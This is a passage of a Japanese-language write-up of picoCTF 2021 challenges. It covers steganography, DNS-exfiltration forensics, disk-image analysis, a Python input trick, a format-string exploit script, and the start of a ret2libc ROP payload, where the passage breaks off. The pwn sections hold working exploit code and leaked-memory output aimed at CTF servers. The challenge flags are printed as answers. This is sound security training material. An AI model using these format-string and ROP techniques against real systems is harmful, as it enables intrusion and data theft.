<li>instructions.txt</li>
</ul>
<pre>
GSGCQBRFAGRAPELCGBHEGENSSVPFBJRZHFGQVFTHVFRBHESYNTGENAFSRE.SVTHERBHGNJNLGBUVQRGURSYNTNAQVJVYYPURPXONPXSBEGURCYNA
</pre>
<ul>
<li>plan</li>
</ul>
<pre>
VHFRQGURCEBTENZNAQUVQVGJVGU-QHRQVYVTRAPR.PURPXBHGGURCUBGBF
</pre>
<br />
これらは、rot13すると、以下のような英語の文章になります。
<pre>
TFTP DOESNT ENCRYPT OUR TRAFFIC SO WE MUST DISGUISE OUR FLAG TRANSFER. FIGURE OUT AWAY TO HIDE THE FLAG AND I WILL CHECK BACK FOR THE PLAN
I USED THE PROGRAM AND HID IT WITH-DUE DILIGENCE. CHECK OUT THE PHOTOS
</pre>
<br />
<ul>
<li>program.deb</li>
</ul>
<p>以下のように解凍できます。中身は、steghideでした。</p>
<pre>
$ ar vx program.deb
</pre>
<br />
<pre>
$ steghide extract -p 'DUEDILIGENCE' -sf picture3.bmp 
wrote extracted data to "flag.txt".

$ cat flag.txt
picoCTF{h1dd3n_1n_pLa1n_51GHT_18375919}
</pre>
<br />
<p>Flag: <code>picoCTF{h1dd3n_1n_pLa1n_51GHT_18375919}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="forensics-wireshark-twoo-twooo-two-twoo-100-points">[Forensics]: Wireshark twoo twooo two twoo&hellip; (100 points)</h2>
<hr>
<h3 id="challenge-18">Challenge</h3>
<blockquote>
<p>Can you find the flag? shark2.pcapng.
<br /><br />
Hint1: Did you really find <em>the</em> flag?
<br /><br />
Hint2: Look for traffic that seems suspicious.</p>
</blockquote>
<br />
<h3 id="solution-19">Solution</h3>
<p>DNS Queryが明らかに怪しいです。</p>
<p>問い合わせ先のIPは2つあって、一つは8.8.8.8。もう一つは18.217.1.57。</p>
<p>まずは、Wiresharkで、<code>dns and ip.addr==18.217.1.57</code>でフィルターして一旦別ファイルとして保存しておきます。</p>
<pre>
$ tshark -r shark2_dns_18.217.1.57.pcapng -Y "dns" -T fields -e "dns.qry.name" | cut -d. -f1 | uniq | tr -d "\n" | base64 -d ; echo
picoCTF{dns_3xf1l_ftw_deadbeef}
</pre>
<br />
<p>Flag: <code>picoCTF{dns_3xf1l_ftw_deadbeef}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="forensics-disk-disk-sleuth-110-points">[Forensics]: Disk, disk, sleuth! (110 points)</h2>
<hr>
<h3 id="challenge-19">Challenge</h3>
<blockquote>
<p>Use <code>srch_strings</code> from the sleuthkit and some terminal-fu to find a flag in this disk image: dds1-alpine.flag.img.gz</p>
</blockquote>
<br />
<h3 id="solution-20">Solution</h3>
<p>stringsで解けました。</p>
<br />
<p>Flag: <code>picoCTF{f0r3ns1c4t0r_n30phyt3_ad5c96c0}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="forensics-disk-disk-sleuth-ii-130-points">[Forensics]: Disk, disk, sleuth! II (130 points)</h2>
<hr>
<h3 id="challenge-20">Challenge</h3>
<blockquote>
<p>All we know is the file with the flag is named <code>down-at-the-bottom.txt</code>&hellip; Disk image: dds2-alpine.flag.img.gz
<br /><br />
Hint1: The sleuthkit has some great tools for this challenge as well.
<br /><br />
Hint2: Sleuthkit docs here are so helpful: TSK Tool Overview <a href="http://wiki.sleuthkit.org/index.php?title=TSK_Tool_Overview">http://wiki.sleuthkit.org/index.php?title=TSK_Tool_Overview</a>
<br /><br />
Hint3: This disk can also be booted with qemu!</p>
</blockquote>
<br />
<h3 id="solution-21">Solution</h3>
<p>以下のSANSのページがとても参考になりました。</p>
<p><a href="https://www.sans.org/blog/using-image-offsets/">https://www.sans.org/blog/using-image-offsets/</a></p>
<pre>
$ fsstat -o 2048 dds2-alpine.flag.img 
FILE SYSTEM INFORMATION
--------------------------------------------
File System Type: Ext3   <--- !!!
Volume Name: 
Volume ID: dc53a3bb0ae739a5164c89db56bbb12f
:


$ mmls dds2-alpine.flag.img 
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000262143   0000260096   Linux (0x83)


$ expr 2048 \* 512
1048576


$ sudo mount -t ext3 -o ro,loop,offset=1048576 dds2-alpine.flag.img /mnt/test/


$ cd /mnt/test


$ sudo find . -name down-at-the-bottom.txt
./root/down-at-the-bottom.txt
</pre>
<br />
<p>Flag: <code>picoCTF{f0r3ns1c4t0r_n0v1c3_69ab1dc8}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="binary-whats-your-input-150-points">[Binary]: What&rsquo;s your input? (150 points)</h2>
<hr>
<h3 id="challenge-21">Challenge</h3>
<blockquote>
<p>We&rsquo;d like to get your input on a couple things. Think you can answer my questions correctly? in.py nc mercury.picoctf.net 61858.
<br /><br />
Hint: What version of python am I running?</p>
</blockquote>
<br />
<h3 id="solution-22">Solution</h3>
<p><code>open('flag').read()</code> で解けました。</p>
<br />
<p>Flag: <code>picoCTF{v4lua4bl3_1npu7_7607377}</code></p>
<p><br /><br />
<br /><br />
<img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
<br />
ここから下はイベント終了後に行った復習です。</p>
<p><br /><br />
<br /><br /></p>
<h2 id="binary-stonks-20-points">[Binary]: Stonks (20 points)</h2>
<hr>
<h3 id="challenge-22">Challenge</h3>
<blockquote>
<p>I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn&rsquo;t believe you if you told me it&rsquo;s unsecure!
<br /><br />
Hint: Okay, maybe I&rsquo;d believe you if you find my API key.</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>vuln.c</li>
</ul>
<br />
<h3 id="solution-23">Solution</h3>
<p>malloc()とかfree()とかあったので、double-freeとかそこら辺かと思ってスルーしてたんですけど、書式文字列攻撃（Format string bug）でしたね。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="hl"><span class="lnt">32
</span></span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">buy_stonks</span><span class="p">(</span><span class="n">Portfolio</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">api_buf</span><span class="p">[</span><span class="n">FLAG_BUFFER</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="n">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;api&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">f</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Flag file not found. Contact an admin.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">fgets</span><span class="p">(</span><span class="n">api_buf</span><span class="p">,</span> <span class="n">FLAG_BUFFER</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">money</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">money</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">shares</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">Stonk</span> <span class="o">*</span><span class="n">temp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Using patented AI algorithms to buy stonks</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="n">money</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">shares</span> <span class="o">=</span> <span class="p">(</span><span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="n">money</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">temp</span> <span class="o">=</span> <span class="nf">pick_symbol_with_AI</span><span class="p">(</span><span class="n">shares</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">temp</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">p</span><span class="o">-&gt;</span><span class="n">head</span> <span class="o">=</span> <span class="n">temp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">money</span> <span class="o">-=</span> <span class="n">shares</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Stonks chosen</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// TODO: Figure out how to read token from file, for now just ask
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">user_buf</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">300</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;What is your API token?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%300s&#34;</span><span class="p">,</span> <span class="n">user_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Buying stonks with token:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line hl"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="n">user_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// TODO: Actually use key to interact with API
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="nf">view_portfolio</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div>
<br />
<p>まずは、繋いでみて動作を確認します。</p>
<pre>
$ nc mercury.picoctf.net 53437
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Buying stonks with token:
AAAA0x9c62450.0x804b000.0x80489c3.0xf7fadd80.0xffffffff.0x1.0x9c60160.0xf7fbb110.0xf7faddc7.(nil).0x9c61180.0x1.0x9c62430.0x9c62450.0x6f636970.0x7b465443.0x306c5f49.0x345f7435.0x6d5f6c6c.0x306d5f79.0x5f79336e.0x34636462.0x61653532.0xffd5007d.0xf7fe8af8.0xf7fbb440.0x70bab900.0x1.(nil).0xf7e4abe9.0xf7fbc0c0.0xf7fad5c0.0xf7fad000.0xffd54508.0xf7e3b58d.0xf7fad5c0.0x8048eca
Portfolio as of Sun May 30 02:45:13 UTC 2021
</pre>
<br />
<p>書いたコード：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding:utf-8 -*-</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;mercury.picoctf.net&#39;</span><span class="p">,</span> <span class="mi">53437</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span><span class="mi">25</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;2) View my portfolio&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;What is your API token?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;$p&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Buying stonks with token:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;0x&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span> <span class="c1"># To remove &#39;\n&#39;</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># print(r)</span>
</span></span><span class="line"><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="mi">16</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br />
実行結果：
<pre>
$ ./stonks_solve.py
picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}\x00\xff()
</pre>
<br />
<p>Flag: <code>picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="binary-heres-a-libc-90-points">[Binary]: Here&rsquo;s a LIBC (90 points)</h2>
<hr>
<h3 id="challenge-23">Challenge</h3>
<blockquote>
<p>I am once again asking for you to pwn this binary.
<br /><br />
Hint: PWNTools has a lot of useful features for getting offsets.</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>vuln (ELF 64bit)</li>
<li>libc.so.6</li>
<li>Makefile</li>
</ul>
<br />
<h3 id="solution-24">Solution</h3>
<p>まずは、Ghidraでコードを確認します。</p>
<p>main() では大したことをやっていないので、省略します。以下の do_stuff() がキーになる箇所です。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">do_stuff</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">cVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined</span> <span class="n">local_89</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_88</span> <span class="p">[</span><span class="mi">112</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">ulong</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_18</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%[^</span><span class="se">\n</span><span class="s">]&#34;</span><span class="p">,</span><span class="n">local_88</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0040093a</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_89</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">cVar1</span> <span class="o">=</span> <span class="nf">convert_case</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">local_88</span><span class="p">[</span><span class="n">local_10</span><span class="p">],</span><span class="n">local_10</span><span class="p">,</span><span class="n">local_10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_88</span><span class="p">[</span><span class="n">local_10</span><span class="p">]</span> <span class="o">=</span> <span class="n">cVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_10</span> <span class="o">=</span> <span class="n">local_10</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="n">local_88</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br />
checksecも確認。
<pre>
$ checksec vuln
[*] '/home/captureamerica/OneDrive/CTF/picoCTF_2021/Binary/Heres_a_libc/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  './'
</pre>
<br />
実際に繋いでみて、動作確認。入力した文字列を所々大文字にして表示するようです。
<pre>
$ nc mercury.picoctf.net 49464
WeLcOmE To mY EcHo sErVeR!
hoge
HoGe
fuga
FuGa
</pre>
<br />
まずはオフセットをゲットしようと思ったんですが、Kaliではもらったバイナリが動きませんでした。
<pre>
$ ./vuln
Segmentation fault
</pre>
<p>ということで、gdbも当然うごかなかったです。</p>
<br />
<p>ちょっとズルして、他のwriteupから136バイトなのを確認。</p>
<br />
<p>書いたコード (その１)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="hl"><span class="lnt">36
</span></span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#!/usr/bin/env python
</span></span></span><span class="line"><span class="cl"><span class="cp"># -*- coding:utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="nf">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="err">&#39;</span><span class="n">linux</span><span class="err">&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="err">&#39;</span><span class="n">amd64</span><span class="err">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">critical</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">mercury</span><span class="p">.</span><span class="n">picoctf</span><span class="p">.</span><span class="n">net</span><span class="err">&#39;</span><span class="p">,</span> <span class="mi">49464</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="nf">ELF</span><span class="p">(</span><span class="err">&#39;</span><span class="p">.</span><span class="o">/</span><span class="n">vuln</span><span class="err">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="k">asm</span><span class="p">(</span><span class="err">&#39;</span><span class="n">ret</span><span class="err">&#39;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="k">asm</span><span class="p">(</span><span class="err">&#39;</span><span class="n">pop</span> <span class="n">rdi</span><span class="p">;</span> <span class="n">ret</span><span class="err">&#39;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">got_puts</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">&#34;puts&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">plt_puts</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">&#34;puts&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">addr_main</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#34;main&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="nf">ELF</span><span class="p">(</span><span class="err">&#39;</span><span class="p">.</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span><span class="err">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">off_puts</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#34;puts&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">bufsize</span> <span class="o">=</span> <span class="mi">112</span> <span class="o">+</span> <span class="mi">24</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s">&#34;A&#34;</span> <span class="o">*</span> <span class="n">bufsize</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">got_puts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">plt_puts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">addr_main</span><span class="p">)</span>      <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="n">main</span>
